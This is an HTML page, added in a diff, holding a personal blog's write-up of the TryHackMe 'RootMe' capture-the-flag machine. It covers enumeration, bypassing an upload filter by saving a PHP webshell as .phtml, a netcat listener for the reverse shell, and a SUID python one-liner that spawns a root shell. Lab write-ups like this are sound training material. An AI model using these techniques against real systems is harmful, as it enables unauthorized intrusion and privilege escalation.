@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THM RootMe CTF | J Laratro</title>
+    <link rel="stylesheet" href="../../css/main.css">
+    <link rel="stylesheet" href="../../css/effects.css">
+    <link rel="stylesheet" href="../../css/pages.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        .blog-post-content { max-width: 900px; margin: 0 auto; }
+        .blog-post-header { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border-color); }
+        .blog-post-title { font-family: var(--font-display); font-size: 2rem; color: var(--text-primary); margin-bottom: 1rem; }
+        .blog-post-meta { display: flex; gap: 2rem; flex-wrap: wrap; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); }
+        .blog-post-body { font-size: 1rem; line-height: 1.8; color: var(--text-secondary); }
+        .blog-post-body h2 { font-family: var(--font-display); font-size: 1.5rem; color: var(--accent-blue); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); }
+        .blog-post-body h3 { font-family: var(--font-display); font-size: 1.2rem; color: var(--text-primary); margin: 2rem 0 1rem; }
+        .blog-post-body h4 { font-family: var(--font-display); font-size: 1rem; color: var(--accent-green); margin: 1.5rem 0 0.75rem; }
+        .blog-post-body p { margin-bottom: 1rem; }
+        .blog-post-body pre { background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0 1.5rem; font-family: var(--font-mono); font-size: 0.85rem; line-height: 1.5; }
+        .blog-post-body code { background: var(--bg-tertiary); padding: 0.2rem 0.4rem; border-radius: 3px; font-family: var(--font-mono); font-size: 0.9em; color: var(--accent-green); }
+        .blog-post-body pre code { background: transparent; padding: 0; }
+        .blog-post-body ul, .blog-post-body ol { margin: 1rem 0 1.5rem 1.5rem; }
+        .blog-post-body li { margin-bottom: 0.5rem; }
+        .blog-tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
+        .blog-tag { font-family: var(--font-mono); font-size: 0.75rem; padding: 0.3rem 0.6rem; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 4px; color: var(--accent-blue); }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-muted); text-decoration: none; margin-bottom: 2rem; transition: var(--transition-normal); }
+        .back-link:hover { color: var(--accent-blue); }
+        .technique-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
+        .technique-card h3 { margin-top: 0; color: var(--accent-red); }
+    </style>
+</head>
+<body>
+    <!-- CRT Effect -->
+    <div class="crt"></div>
+
+    <!-- Grid Background -->
+    <div class="grid-bg"></div>
+
+    <!-- Classification Bar -->
+    <div class="class-bar"></div>
+
+    <!-- Tactical Frame -->
+    <div class="tactical-frame"></div>
+    <div class="tactical-frame-bottom"></div>
+
+    <!-- Navigation -->
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <div style="display: flex; align-items: center;">
+                <a href="../../index.html" class="nav-logo">
+                    <span class="logo-bracket">[</span>
+                    <span class="logo-text">JL</span>
+                    <span class="logo-bracket">]</span>
+                </a>
+                <span class="logo-tag">CYBER OPS</span>
+            </div>
+            <div class="nav-links">
+                <a href="../../index.html" class="nav-link">./home</a>
+                <a href="../about.html" class="nav-link">./whoami</a>
+                <a href="../cyber-projects.html" class="nav-link">./cyberops</a>
+                <a href="../projects.html" class="nav-link">./research</a>
+                <a href="../blog.html" class="nav-link active">./intel</a>
+                <a href="../contact.html" class="nav-link">./comms</a>
+            </div>
+            <button class="nav-toggle" aria-label="Toggle menu">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </nav>
+
+    <main class="page-content">
+        <div class="blog-post-content">
+            <a href="../blog.html" class="back-link">&larr; Back to Blog</a>
+
+            <article>
+                <header class="blog-post-header">
+                    <h1 class="blog-post-title">TryHackMe: RootMe</h1>
+                    <div class="blog-post-meta">
+                        <span>Type: CTF Writeup</span>
+                        <span>Platform: TryHackMe</span>
+                        <span>Difficulty: Easy</span>
+                    </div>
+                    <div class="blog-tags">
+                        <span class="blog-tag">CTF</span>
+                        <span class="blog-tag">Web</span>
+                        <span class="blog-tag">PHP</span>
+                        <span class="blog-tag">SUID</span>
+                        <span class="blog-tag">PrivEsc</span>
+                    </div>
+                </header>
+
+                <div class="blog-post-body">
+                    <p>In this THM machine, the attacker must enumerate the domain, perform reconnaissance, use a webshell via poorly secured web form, and then escalate privilege from user to root.</p>
+
+                    <h2>Enumeration</h2>
+                    <p>First, enumeration of the domain is performed using dirb/gobuster and nmap.</p>
+
+                    <p>Nmap returns two results:</p>
+                    <ul>
+                        <li>Port 22: SSH</li>
+                        <li>Port 80: Apache server</li>
+                    </ul>
+
+                    <p>Dirb yields interesting results:</p>
+                    <ul>
+                        <li>/panel</li>
+                        <li>/uploads</li>
+                    </ul>
+
+                    <h2>Foothold - PHP Webshell</h2>
+                    <p>The webpage at /panel appears to be a form with an upload button. Since the site is running Apache, we can attempt to upload a PHP webshell.</p>
+
+                    <div class="technique-card">
+                        <h3>Bypass File Extension Filter</h3>
+                        <p>The server performs filtering of file extensions. Attempts:</p>
+                        <ul>
+                            <li>URL encoded nullbyte - didn't work</li>
+                            <li>Saving as .phtml - <strong>success!</strong></li>
+                        </ul>
+                    </div>
+
+                    <p>Start netcat listener and call the file via the /uploads directory:</p>
+                    <pre><code>nc -lvnp 4444</code></pre>
+
+                    <p>User access was granted via netcat. Find the user flag:</p>
+                    <pre><code>find . -type f -iname 'user.txt'</code></pre>
+
+                    <h2>Privilege Escalation - SUID</h2>
+                    <p>The objective is to obtain root via SUID privilege escalation.</p>
+
+                    <h4>Find SUID binaries:</h4>
+                    <pre><code>find / -user root -perm /4000
+# or
+find . -perm /4000</code></pre>
+
+                    <p>Note: 4000 is the permission flag for SUID</p>
+
+                    <p>This search returned many results, but included one peculiar binary: <code>python</code></p>
+
+                    <div class="technique-card">
+                        <h3>Python SUID Exploitation</h3>
+                        <p>Using GTFOBins, a SUID privilege escalation attack was found for Python:</p>
+                        <pre><code>cd /usr/bin/
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+whoami
+# root</code></pre>
+                    </div>
+
+                    <p>After running this command, the escalation was successful and root access was obtained.</p>
+
+                    <h4>Find root flag:</h4>
+                    <pre><code>cd ..
+find . -iname 'root.txt'</code></pre>
+
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="cyber-footer">
+        <div class="footer-content">
+            <div class="footer-status">
+                <span class="footer-dot"></span>
+                <span>SYSTEMS ONLINE</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://github.com/jeremylaratro" target="_blank" class="footer-link">[GitHub]</a>
+                <a href="https://www.linkedin.com/in/JeremyLaratro" target="_blank" class="footer-link">[LinkedIn]</a>
+            </div>
+            <div class="footer-copy">
+                &copy; <span id="year"></span> // Secure Channel
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
